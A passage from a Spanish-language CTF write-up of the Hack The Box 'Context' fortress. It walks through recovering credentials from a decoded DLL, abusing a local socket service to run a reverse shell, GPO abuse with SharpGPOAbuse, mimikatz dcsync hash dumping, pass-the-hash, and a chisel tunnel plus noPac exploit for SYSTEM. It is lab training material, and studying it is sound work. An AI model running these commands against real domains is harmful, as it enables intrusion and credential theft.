AA0AAgAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAwAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAMAAAAoDsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

SQL&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Decodeamos el contenido de <code class="language-plaintext highlighter-rouge">base64</code> y el archivo que nos queda parece es un <code class="language-plaintext highlighter-rouge">dll</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ cat </span><span class="p">data | </span><span class="ve">base64</span><span class="p"> -d &gt; file

</span><span class="ve">❯ file </span><span class="p">file
file: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections  </span>
</code></pre></div></div><br>

<p class="plain-text">Al abrir el <code class="language-plaintext highlighter-rouge">dll</code> con <a href="https://github.com/dnSpy/dnSpy">dnspy</a> encontramos una función <code class="language-plaintext highlighter-rouge">BackupClients</code> la cual define <code class="language-plaintext highlighter-rouge">credenciales</code> a nivel de sistema para llamar mas adelante al archivo <code class="language-plaintext highlighter-rouge">clients.html</code></p>
<a href="/fortresses/context/18.png" target="_blank"><div><p><img src="/fortresses/context/18.png"></p></div></a>

<p class="plain-text">Las <code class="language-plaintext highlighter-rouge">credenciales</code> son a nivel de sistema y el puerto <code class="language-plaintext highlighter-rouge">5985</code>, asi que nos podemos conectar con <code class="language-plaintext highlighter-rouge">evil-winrm</code> y conseguir una <code class="language-plaintext highlighter-rouge">shell</code> como el usuario <code class="language-plaintext highlighter-rouge">jay.teignton</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ evil-winrm</span><span class="p"> -i 10.13.37.12 -u jay.teignton -p </span><span class="am">'D0ntL0seSk3l3tonK3y!'</span><span class="p">  
PS C:\Users\jay.teignton\Documents&gt; </span><span class="am">whoami</span><span class="p">
teignton\jay.teignton
PS C:\Users\jay.teignton\Documents&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">En el directorio <code class="language-plaintext highlighter-rouge">Documents</code> encontramos un archivo llamado <code class="language-plaintext highlighter-rouge">WindowsService.exe</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\jay.teignton\Documents&gt; </span><span class="am">dir</span><span class="p">

    Directory: C:\Users\jay.teignton\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/7/2020  10:31 PM          11264 WindowsService.exe  

PS C:\Users\jay.teignton\Documents&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos descargar el archivo <code class="language-plaintext highlighter-rouge">exe</code> para analizarlo localmente facilmente usando la funcion <code class="language-plaintext highlighter-rouge">download</code> incluida entre las herramientas que vienen con <code class="language-plaintext highlighter-rouge">evil-winrm</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\jay.teignton\Documents&gt; </span><span class="am">download</span><span class="p"> .\WindowsService.exe WindowsService.exe  
</span><span class="az">
Info: Downloading .\WindowsService.exe to WindowsService.exe

Info: Download successful!
</span><span class="p">
PS C:\Users\jay.teignton\Documents&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Al abrir el <code class="language-plaintext highlighter-rouge">exe</code> con <code class="language-plaintext highlighter-rouge">dnspy</code> encontramos una función <code class="language-plaintext highlighter-rouge">Start</code> que parece la principal</p>
<a href="/fortresses/context/19.png" target="_blank"><div><p><img src="/fortresses/context/19.png"></p></div></a>

<p class="plain-text">La función inicia un <code class="language-plaintext highlighter-rouge">socket</code> en el puerto <code class="language-plaintext highlighter-rouge">7734</code>, despues comprueba que la función <code class="language-plaintext highlighter-rouge">CheckClientPassword</code> devuelva true si es asi pasa a la función <code class="language-plaintext highlighter-rouge">CheckClientCommand</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="o">public </span><span class="no">void </span><span class="na">Start</span><span class="p">()
{
    this.IP </span><span class="o">= </span><span class="p">IPAddress.Loopback;
    this.Endpoint </span><span class="o">= new </span><span class="na">IPEndPoint</span><span class="p">(this.IP, </span><span class="mi">7734</span><span class="p">);
    </span><span class="o">try</span><span class="p">
    {
        this.Listener </span><span class="o">= new </span><span class="na">Socket</span><span class="p">(this.IP.AddressFamily, SocketType.Stream, ProtocolType.Tcp);  
        this.Listener.Bind(this.Endpoint);
        this.Listener.Listen(</span><span class="mi">25</span><span class="p">);
        </span><span class="o">for</span><span class="p"> (;;)
        {
            </span><span class="na">Socket </span><span class="p">handler </span><span class="o">= </span><span class="p">this.Listener.Accept();
            </span><span class="o">new </span><span class="na">Thread</span><span class="p">(</span><span class="o">delegate</span><span class="p">()
            {
                </span><span class="o">try</span><span class="p">
                {
                    </span><span class="no">string </span><span class="p">data </span><span class="o">= </span><span class="p">this.GetClientMessage(handler).Trim();
                    </span><span class="o">if</span><span class="p"> (this.CheckClientPassword(handler, data))
                    {
                        data </span><span class="o">= </span><span class="p">this.GetClientMessage(handler).Trim();
                        this.CheckClientCommand(handler, data);
                    }
                }
                </span><span class="o">finally</span><span class="p">
                {
                    handler.Shutdown(SocketShutdown.Both);
                    handler.Close();
                }
            }).Start();
        }
    }
    </span><span class="o">catch</span><span class="p"> (</span><span class="na">Exception</span><span class="p">)
    {
    }
    </span><span class="o">finally</span><span class="p">
    {
        this.Listener.Shutdown(SocketShutdown.Both);
    }
}</span>
</code></pre></div></div><br>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">CheckClientPassword</code> verifica que la contraseña sea igual a el resultado de <code class="language-plaintext highlighter-rouge">TCPServer.Password</code> y muestra que esta se indica usando <code class="language-plaintext highlighter-rouge">password=</code> como prefix</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="o">private </span><span class="no">bool </span><span class="na">CheckClientPassword</span><span class="p">(</span><span class="na">Socket </span><span class="am">handler</span><span class="p">, </span><span class="no">string </span><span class="am">data</span><span class="p">)  
{
    </span><span class="no">string</span><span class="p">[] array </span><span class="o">= </span><span class="p">data.Split(</span><span class="o">new </span><span class="no">string</span><span class="p">[]
    {
        </span><span class="s">"password="</span><span class="p">
    }, StringSplitOptions.None);
    </span><span class="o">if</span><span class="p"> (array.Length </span><span class="o">!= </span><span class="mi">2</span><span class="o"> || </span><span class="p">array[</span><span class="mi">1</span><span class="p">] </span><span class="o">== </span><span class="mi">null</span><span class="p">)
    {
        handler.Send(this.ErrorMessage);
        </span><span class="o">return </span><span class="mi">false</span><span class="p">;
    }
    </span><span class="o">if</span><span class="p"> (array[</span><span class="mi">1</span><span class="p">] </span><span class="o">!= </span><span class="p">TCPServer.Password())
    {
        handler.Send(this.ErrorMessage);
        </span><span class="o">return </span><span class="mi">false</span><span class="p">;
    }
    handler.Send(this.SuccessMessage);
    </span><span class="o">return </span><span class="mi">true</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">La <code class="language-plaintext highlighter-rouge">contraseña</code> que se espera en realidad es bastante simple, consta del resultado de la <code class="language-plaintext highlighter-rouge">fecha</code> actual en el siguiente formato <code class="language-plaintext highlighter-rouge">yyyy-MM-dd</code> mas la cadena <code class="language-plaintext highlighter-rouge">-thisisleet</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="o">private static </span><span class="no">string </span><span class="na">Password</span><span class="p">()
{
    </span><span class="o">return </span><span class="p">DateTime.Now.ToString(</span><span class="s">"yyyy-MM-dd"</span><span class="p">) </span><span class="o">+ </span><span class="s">"-thisisleet"</span><span class="p">;  
}</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos obtenerla usando <code class="language-plaintext highlighter-rouge">Get-Date</code> indicando el formato y agregando la <code class="language-plaintext highlighter-rouge">cadena</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\jay.teignton\Documents&gt; (</span><span class="am">Get-Date </span><span class="c1">-Format </span><span class="az">"yyyy-MM-dd"</span><span class="p">)</span><span class="c1"> +</span><span class="az"> "-thisisleet"</span><span class="p">  
2023-04-19-thisisleet
PS C:\Users\jay.teignton\Documents&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">CheckClientCommand</code> solo espera un comando con el prefix <code class="language-plaintext highlighter-rouge">command=</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="o">private </span><span class="no">bool </span><span class="na">CheckClientCommand</span><span class="p">(</span><span class="na">Socket </span><span class="am">handler</span><span class="p">, </span><span class="no">string </span><span class="am">data</span><span class="p">)  
{
    </span><span class="no">string</span><span class="p">[] array </span><span class="o">= </span><span class="p">data.Split(</span><span class="o">new </span><span class="no">string</span><span class="p">[]
    {
        </span><span class="s">"command="</span><span class="p">
    }, StringSplitOptions.None);
    </span><span class="o">if</span><span class="p"> (array.Length </span><span class="o">!= </span><span class="mi">2</span><span class="o"> || </span><span class="p">array[</span><span class="mi">1</span><span class="p">] </span><span class="o">== </span><span class="mi">null</span><span class="p">)
    {
        handler.Send(this.ErrorMessage);
        </span><span class="o">return </span><span class="mi">false</span><span class="p">;
    }
    </span><span class="no">string </span><span class="p">text </span><span class="o">= </span><span class="p">array[</span><span class="mi">1</span><span class="p">];
    </span><span class="o">foreach</span><span class="p"> (</span><span class="no">string </span><span class="p">value </span><span class="o">in new </span><span class="no">string</span><span class="p">[]
    {
        </span><span class="s">" "</span><span class="p">,
        </span><span class="s">"Windows"</span><span class="p">,
        </span><span class="s">"System32"</span><span class="p">,
        </span><span class="s">"PowerShell"</span><span class="p">
    })
    {
        </span><span class="o">if</span><span class="p"> (text.Contains(value))
        {
            handler.Send(this.ErrorMessage);
            </span><span class="o">return </span><span class="mi">false</span><span class="p">;
        }
    }
    this.CreateClientProcess(text);
    handler.Send(this.Flag);
    </span><span class="o">return </span><span class="mi">true</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Aprovechando la funcion <code class="language-plaintext highlighter-rouge">upload</code> subimos el <code class="language-plaintext highlighter-rouge">netcat.exe</code> para conectarnos al <code class="language-plaintext highlighter-rouge">7734</code> sin embargo para usarlo necesitaremos mejorar la shell usando <a href="https://github.com/antonioCoco/ConPtyShell">ConPtyShell</a></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\jay.teignton\Documents&gt; </span><span class="am">upload </span><span class="p">netcat.exe
</span><span class="az">
Info: Uploading netcat.exe to C:\Users\jay.teignton\Documents\netcat.exe  
</span><span class="sa">
Data: 60360 bytes of 60360 bytes copied
</span><span class="az">
Info: Upload successful!
</span><span class="p">
PS C:\Users\jay.teignton\Documents&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Nos conectamos al puero <code class="language-plaintext highlighter-rouge">7734</code>, enviamos la contraseña que hemos obtenido antes y como comando ejecutaremos el <code class="language-plaintext highlighter-rouge">shell.exe</code> que hemos subido de antes, al hacerlo recibimos la <code class="language-plaintext highlighter-rouge">flag</code> ademas de una powershell como <code class="language-plaintext highlighter-rouge">andy.teignton</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\jay.teignton\Documents&gt; </span><span class="am">.\netcat.exe </span><span class="p">127.0.0.1 7734 -v  
WEB.TEIGNTON.HTB [127.0.0.1] 7734 (?) open
password=2023-04-19-thisisleet
OK
command=c:\programdata\shell.exe
CONTEXT{l0l_s0c3ts_4re_fun}
PS C:\Users\jay.teignton\Documents&gt;</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ sudo netcat</span><span class="p"> -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.37.12
Windows PowerShell running as user andy.teignton on WEB
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Windows\system32&gt; </span><span class="am">whoami</span><span class="p">
teignton\andy.teignton
PS C:\Windows\system32&gt;</span>
</code></pre></div></div><br>
</section>

<section class="post" id="flag7">
<br><h3 class="post-title">Key to the castle</h3>
<h4 class="post-title">CONTEXT{OU_4bl3_t0_k33p_4_s3cret?}</h4><br>

<p class="plain-text">Después de buscar formas de escalar privilegios encontramos que podemos crear un <code class="language-plaintext highlighter-rouge">Group Policy Object</code>, asi que creamos un nuevo objeto con el nombre <code class="language-plaintext highlighter-rouge">privesc</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">New-GPO</span><span class="c1"> -Name </span><span class="p">privesc </span><span class="c1">-Comment </span><span class="az">"Privilege Escalation"</span><span class="p">  

DisplayName      : privesc
DomainName       : TEIGNTON.HTB
Owner            : TEIGNTON\andy.teignton
Id               : d85448d7-e996-4863-816c-ef9930ba5206 
GpoStatus        : AllSettingsEnabled
Description      : Privilege Escalation
CreationTime     : 19/04/2023 00:10:22
ModificationTime : 19/04/2023 00:10:22
UserVersion      : AD Version: 0, SysVol Version: 0     
ComputerVersion  : AD Version: 0, SysVol Version: 0     
WmiFilter        :

PS C:\ProgramData&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora linkeamos el <code class="language-plaintext highlighter-rouge">GPO</code> privesc al OU <code class="language-plaintext highlighter-rouge">Domain Controllers</code> en <code class="language-plaintext highlighter-rouge">teignton.htb</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">New-GPLink </span><span class="c1">-Name </span><span class="p">privesc </span><span class="c1">-Target </span><span class="az">"OU=Domain Controllers,DC=TEIGNTON,DC=HTB" </span><span class="c1">-LinkEnabled </span><span class="p">Yes  

GpoId       : d85448d7-e996-4863-816c-ef9930ba5206     
DisplayName : privesc
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=TEIGNTON,DC=HTB 
Order       : 2

PS C:\ProgramData&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Usando <a href="https://github.com/byronkg/SharpGPOAbuse">SharpGPOAbuse</a> podemos aprovecharnos del <code class="language-plaintext highlighter-rouge">GPO</code> vulnerable que acabamos de crear para añadir un nivel <code class="language-plaintext highlighter-rouge">Administrador</code> local, en este caso a <code class="language-plaintext highlighter-rouge">jay.teignton</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">.\SharpGPOAbuse.exe </span><span class="c1">--AddLocalAdmin </span><span class="c1">--UserAccount </span><span class="p">jay.teignton </span><span class="c1">--gponame </span><span class="p">privesc
[+] Domain = teignton.htb
[+] Domain Controller = WEB.TEIGNTON.HTB
[+] Distinguished Name = CN=Policies,CN=System,DC=TEIGNTON,DC=HTB
[+] SID Value of jay.teignton = S-1-5-21-3174020193-2022906219-3623556448-1103
[+] GUID of "privesc" is: {D85448D7-E996-4863-816C-EF9930BA5206}
[+] Creating file \\teignton.htb\SysVol\teignton.htb\Policies\{D85448D7-E996-4863-816C-EF9930BA5206}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf  
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
PS C:\ProgramData&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Para aplicar los cambios, <code class="language-plaintext highlighter-rouge">actualizamos</code> la configuración de las políticas de grupo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\ProgramData&gt; </span><span class="am">gpupdate </span><span class="p">/force
Updating policy...

Computer Policy update has completed successfully.  
User Policy update has completed successfully.

PS C:\ProgramData&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Iniciamos de nuevo sesión como <code class="language-plaintext highlighter-rouge">jay.teignton</code> y al mirar los <code class="language-plaintext highlighter-rouge">grupos</code> a los que pertenecemos ahora estamos tambien dentro de el grupo local <code class="language-plaintext highlighter-rouge">Administrators</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ evil-winrm</span><span class="p"> -i 10.13.37.12 -u jay.teignton -p </span><span class="am">'D0ntL0seSk3l3tonK3y!'</span><span class="p">
PS C:\Users\jay.teignton\Documents&gt; </span><span class="am">whoami</span><span class="p">
teignton\jay.teignton
PS C:\Users\jay.teignton\Documents&gt; </span><span class="am">Get-ADPrincipalGroupMembership </span><span class="c1">-Identity </span><span class="az">"jay.teignton"</span><span class="p"> | </span><span class="am">Select </span><span class="p">Name  

Name
----
Domain Users
Administrators
Remote Desktop Users
Remote Management Users

PS C:\Users\jay.teignton\Documents&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora deberiamos poder entrar en el directorio de <code class="language-plaintext highlighter-rouge">Administrator</code> y leer la <code class="language-plaintext highlighter-rouge">flag</code>, ademas de un <code class="language-plaintext highlighter-rouge">info.txt</code> donde se nos felicita por haber completado la <code class="language-plaintext highlighter-rouge">fortaleza</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\jay.teignton\Documents&gt; </span><span class="am">cd </span><span class="p">C:\Users\Administrator\Documents
PS C:\Users\Administrator\Documents&gt; dir

    Directory: C:\Users\Administrator\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/12/2020   5:53 PM                SQL Server Management Studio  
d-----       10/12/2020   6:53 PM                Visual Studio 2017
-a----        7/15/2020   8:15 PM             34 flag.txt
-a----        7/29/2020  12:28 PM            188 info.txt

PS C:\Users\Administrator\Documents&gt; </span><span class="am">type </span><span class="p">flag.txt
CONTEXT{OU_4bl3_t0_k33p_4_s3cret?}
PS C:\Users\Administrator\Documents&gt; </span><span class="am">type </span><span class="p">info.txt
Congrats on completing the Fortress. You've got a direct line to the Recruitment Manager! Title your message - FORTRESS COMPLETED and send to recruitment@contextis.com, alongside your CV.  
PS C:\Users\Administrator\Documents&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Si queremos conseguir una <code class="language-plaintext highlighter-rouge">shell</code> como <code class="language-plaintext highlighter-rouge">Administrator</code> podemos dumpear los hashes con <code class="language-plaintext highlighter-rouge">mimikatz</code>, iniciamos subiendolo con la función <code class="language-plaintext highlighter-rouge">upload</code> de evil-winrm</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\jay.teignton\Documents&gt; </span><span class="am">upload </span><span class="p">mimikatz.exe
</span><span class="az">
Info: Uploading mimikatz.exe to C:\Users\jay.teignton\Documents\mimikatz.exe
</span><span class="sa">
Data: 1666740 bytes of 1666740 bytes copied
</span><span class="az">
Info: Upload successful!
</span><span class="p">
PS C:\Users\jay.teignton\Documents&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">mimikatz</code> podemos dumpear el <code class="language-plaintext highlighter-rouge">hash NTLM</code> del usuario <code class="language-plaintext highlighter-rouge">Administrator</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\jay.teignton\Documents&gt; </span><span class="am">.\mimikatz.exe </span><span class="az">"lsadump::dcsync /user:Administrator" </span><span class="p">exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /domain:teignton.htb /user:Administrator
[DC] 'teignton.htb' will be the domain
[DC] 'WEB.TEIGNTON.HTB' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
User Principal Name  : Administrator@TEIGNTON.HTB
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 12/10/2020 14:34:20
Object Security ID   : S-1-5-21-3174020193-2022906219-3623556448-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 5059c4cf183da02e2f41bb1f53d713cc

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f0a3bbc4c8a22573685ec11d8b5a76c9

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-K0IK59G7ILOAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 90f5c97ddad9eaf5aa247836e00b7a4c89935258c2a01ce051594cf3cb03798d  
      aes128_hmac       (4096) : 466d899b2f855f4f705cb990a427168a
      des_cbc_md5       (4096) : c451bf16c416dce0

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-K0IK59G7ILOAdministrator
    Credentials
      des_cbc_md5       : c451bf16c416dce0


mimikatz(commandline) # exit
Bye!
PS C:\Users\jay.teignton\Documents&gt;</span>
</code></pre></div></div><br>

<p class="plain-text">Ya con el <code class="language-plaintext highlighter-rouge">hash</code> podemos hacer un <code class="language-plaintext highlighter-rouge">passthehash</code> usando solo el hash <code class="language-plaintext highlighter-rouge">NTLM</code> de <code class="language-plaintext highlighter-rouge">Administrator</code> para autenticarnos y obtener una <code class="language-plaintext highlighter-rouge">powershell</code> como Administrator</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ evil-winrm</span><span class="p"> -i 10.13.37.12 -u Administrator -H 5059c4cf183da02e2f41bb1f53d713cc  
PS C:\Users\Administrator\Documents&gt; </span><span class="am">whoami</span><span class="p">
teignton\administrator
PS C:\Users\Administrator\Documents&gt; </span><span class="am">type </span><span class="p">flag.txt
CONTEXT{OU_4bl3_t0_k33p_4_s3cret?}
PS C:\Users\Administrator\Documents&gt;</span>
</code></pre></div></div><br>
</section>

<section class="post" id="extra">
<br><h3 class="post-title">Extra</h3>
<h4 class="post-title">CVE-2021-42278 / CVE-2021-42287 - Administrator</h4><br>

<p class="plain-text">Una via alternativa es usar <a href="https://github.com/Ridter/noPac">noPac</a>, sin embargo puertos que necesitamos como <code class="language-plaintext highlighter-rouge">445</code> y <code class="language-plaintext highlighter-rouge">88</code> solo estan disponibles de forma interna asi que iniciamos creando un <code class="language-plaintext highlighter-rouge">proxy</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="p">PS C:\Users\jay.teignton\Documents&gt; </span><span class="am">.\chisel.exe </span><span class="p"></span><span class="p">client 10.10.14.10:9999 R:socks  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ chisel </span><span class="p">server --reverse --port 9999
server: Reverse tunnelling enabled
server: Listening on http://0.0.0.0:9999
server: session#1: tun: proxy#R:127.0.0.1:1080=&gt;socks: Listening  </span>
</code></pre></div></div><br>

<p class="plain-text">Una vez creado el proxy con chisel podemos tirar <a href="https://github.com/Ridter/noPac">noPac</a>, con el parametro <code class="language-plaintext highlighter-rouge">-shell</code> nos otorgara una cmd como el usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> directamente en el <code class="language-plaintext highlighter-rouge">DC</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight"><code><span class="ve">❯ proxychains </span><span class="p">-q python3 noPac.py teignton.htb/jay.teignton:D0ntL0seSk3l3tonK3y! -shell -use-ldap -dc-ip 10.13.37.12  

███    ██  ██████  ██████   █████   ██████ 
████   ██ ██    ██ ██   ██ ██   ██ ██      
██ ██  ██ ██    ██ ██████  ███████ ██      
██  ██ ██ ██    ██ ██      ██   ██ ██      
██   ████  ██████  ██      ██   ██  ██████ 
    
[*] Current ms-DS-MachineAccountQuota = 10
[*] Selected Target web.teignton.htb
[*] Total Domain Admins 1
[*] will try to impersonate Administrator
[*] Adding Computer Account "WIN-MLF5VZHUDBC$"
[*] MachineAccount "WIN-MLF5VZHUDBC$" password = Z2ZlBB)bvybY
[*] Successfully added machine account WIN-MLF5VZHUDBC$ with password Z2ZlBB)bvybY.
[*] WIN-MLF5VZHUDBC$ object = CN=WIN-MLF5VZHUDBC,CN=Computers,DC=TEIGNTON,DC=HTB
[*] WIN-MLF5VZHUDBC$ sAMAccountName == web
[*] Saving a DC's ticket in web.ccache
[*] Reseting the machine account to WIN-MLF5VZHUDBC$
[*] Restored WIN-MLF5VZHUDBC$ sAMAccountName to original value
[*] Using TGT from cache
[*] Impersonating Administrator
[*] 	Requesting S4U2self
[*] Saving a user's ticket in Administrator.ccache
[*] Rename ccache to Administrator_web.teignton.htb.ccache
[*] Attempting to del a computer with the name: WIN-MLF5VZHUDBC$
[-] Delete computer WIN-MLF5VZHUDBC$ Failed! Maybe the current user does not have permission.
[*] Pls make sure your choice hostname and the -dc-ip are same machine !!
[*] Exploiting..
[!] Launching semi-interactive shell - Careful what you execute

C:\Windows\system32&gt;</span><span class="am">whoami</span><span class="p">
nt authority\system

C:\Windows\system32&gt;</span>
</code></pre></div></div><br>



</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">© 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>

</body></html>
